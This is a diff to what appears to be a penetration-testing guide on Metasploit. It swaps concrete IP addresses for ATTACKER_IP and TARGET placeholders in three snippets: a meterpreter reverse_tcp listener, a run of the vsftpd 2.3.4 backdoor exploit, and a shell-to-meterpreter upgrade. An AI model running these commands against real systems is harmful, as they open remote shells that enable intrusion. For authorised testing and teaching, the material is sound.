@@ -117,7 +117,7 @@ Only install persistence when the engagement scope explicitly allows it. Note ev
 Catch a payload you generated with msfvenom:
 
 ```bash
-msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; run"
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 443; run"
 ```
 
 A typical module run (set the target, payload and listener, then fire):
@@ -125,7 +125,7 @@ A typical module run (set the target, payload and listener, then fire):
 ```text
 msf6 > search type:exploit name:vsftpd
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 > set RHOSTS 10.10.10.5
+msf6 > set RHOSTS TARGET
 msf6 > check
 msf6 > run
 ```
@@ -134,7 +134,7 @@ Upgrade a plain shell (from another tool) to Meterpreter for the post-exploitati
 
 ```text
 msf6 > use post/multi/manage/shell_to_meterpreter
-msf6 > set LHOST 10.10.14.5
+msf6 > set LHOST ATTACKER_IP
 msf6 > set SESSION 1
 msf6 > run
 ```
